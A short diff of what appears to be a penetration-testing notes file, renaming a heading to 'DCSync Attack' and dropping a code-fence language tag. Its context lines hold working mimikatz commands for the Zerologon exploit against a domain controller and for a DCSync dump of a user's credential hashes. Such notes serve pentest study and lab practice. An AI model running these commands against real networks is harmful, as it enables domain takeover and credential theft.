@@ -1141,9 +1141,9 @@ mimikatz.exe "lsadump::zerologon /target:192.168.187.97 /account:DC01$" exit
 mimikatz.exe "lsadump::zerologon /target:192.168.187.97 /account:DC01$ /exploit" exit
 ~~~
 
-## Replicate AD account hashes
+## DCSync Attack
 
-~~~ powershell
+~~~
 mimikatz # lsadump::dcsync /domain:secura.yzx /dc:dc01 /user:michael /authuser:DC01$ /authdomain:main /authpassword:"" /authntlm
 ~~~
 
